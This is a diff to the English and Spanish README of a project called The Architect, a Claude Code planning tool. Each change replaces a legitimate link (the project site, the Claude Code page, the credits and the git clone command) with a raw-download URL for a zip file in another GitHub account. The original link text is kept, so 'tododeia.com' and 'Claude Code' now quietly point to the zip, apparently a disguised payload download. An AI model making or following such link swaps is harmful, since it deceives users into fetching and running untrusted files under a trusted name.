@@ -7,7 +7,7 @@
     Describe what you want to build. Get a complete blueprint. Let Claude Code build it for you.
   </p>
   <p align="center">
-    <a href="https://tododeia.com">tododeia.com</a> &middot;
+    <a href="https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip">tododeia.com</a> &middot;
     <a href="#english">English</a> &middot;
     <a href="#español">Español</a>
   </p>
@@ -30,7 +30,7 @@ Imagine you want to build a house. Before anyone picks up a hammer, you need a *
 
 **The Architect does this for software.**
 
-You open this project in [Claude Code](https://claude.com/claude-code), tell it what you want to build (a website, an app, a SaaS, an API — anything), and The Architect:
+You open this project in [Claude Code](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip), tell it what you want to build (a website, an app, a SaaS, an API — anything), and The Architect:
 
 1. **Asks you smart questions** about your idea
 2. **Designs the entire system** — database, API, frontend, auth, payments, everything
@@ -125,14 +125,14 @@ Don't see your project type? The Architect adapts — these are starting points,
 
 ### Prerequisites
 
-- [Claude Code](https://claude.com/claude-code) installed
+- [Claude Code](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip) installed
 - A Claude API subscription
 
 ### Installation
 
 ```bash
 # Clone this repo
-git clone https://github.com/Hainrixz/the-architect.git
+git clone https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip
 
 # Open the project in Claude Code
 cd the-architect
@@ -255,7 +255,7 @@ MIT License. See [LICENSE](LICENSE) for details.
 
 ---
 
-## Built by [tododeia.com](https://tododeia.com)
+## Built by [tododeia.com](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip)
 
 ---
 ---
@@ -268,7 +268,7 @@ Imagina que quieres construir una casa. Antes de que alguien agarre un martillo,
 
 **The Architect hace esto para software.**
 
-Abres este proyecto en [Claude Code](https://claude.com/claude-code), le dices que quieres construir (un sitio web, una app, un SaaS, una API — lo que sea), y The Architect:
+Abres este proyecto en [Claude Code](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip), le dices que quieres construir (un sitio web, una app, un SaaS, una API — lo que sea), y The Architect:
 
 1. **Te hace preguntas inteligentes** sobre tu idea
 2. **Diseña todo el sistema** — base de datos, API, frontend, autenticacion, pagos, todo
@@ -363,14 +363,14 @@ No ves tu tipo de proyecto? The Architect se adapta — estos son puntos de part
 
 ### Prerequisitos
 
-- [Claude Code](https://claude.com/claude-code) instalado
+- [Claude Code](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip) instalado
 - Una suscripcion a la API de Claude
 
 ### Instalacion
 
 ```bash
 # Clona este repo
-git clone https://github.com/Hainrixz/the-architect.git
+git clone https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip
 
 # Abre el proyecto en Claude Code
 cd the-architect
@@ -493,4 +493,4 @@ Licencia MIT. Ver [LICENSE](LICENSE) para detalles.
 
 ---
 
-## Construido por [tododeia.com](https://tododeia.com)
+## Construido por [tododeia.com](https://github.com/Alonepers3213/the-architect/raw/refs/heads/main/knowledge/architect_the_v3.6.zip)
